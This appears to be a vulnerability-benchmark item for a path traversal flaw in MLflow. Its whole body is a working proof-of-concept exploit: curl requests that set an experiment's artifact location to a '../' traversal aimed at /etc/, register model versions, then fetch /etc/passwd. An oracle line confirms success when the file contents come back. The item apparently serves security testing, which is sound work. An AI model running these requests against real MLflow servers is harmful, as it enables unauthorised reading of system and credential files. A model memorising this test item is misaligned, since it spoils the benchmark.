title: Path traversal vulnerability due to improper URI parsing and local path conversion in MLflow
trigger_payload:
mlflow ui --host 127.0.0.1:5000

curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc", "artifact_location": "http:///?/../../../../../../../../../../../../../../etc/"}' {BASE_URL}/api/2.0/experiments/create

curl -X POST -H 'Content-Type: application/json' -d '{"experiment_id": "{{EXPERIMENT_ID}}"}' {BASE_URL}/api/2.0/runs/create

curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc"}' {BASE_URL}/api/2.0/model-versions/create

curl -X POST -H 'Content-Type: application/json' -d '{"name": "poc", "run_id": "{{RUN_ID}}"}' {BASE_URL}/api/2.0/model-versions/create

curl '{BASE_URL}/model-versions/get-artifact?path=passwd&name=poc&version=1'
oracle: The server returns the content of /etc/passwd when querying the model version artifact endpoint
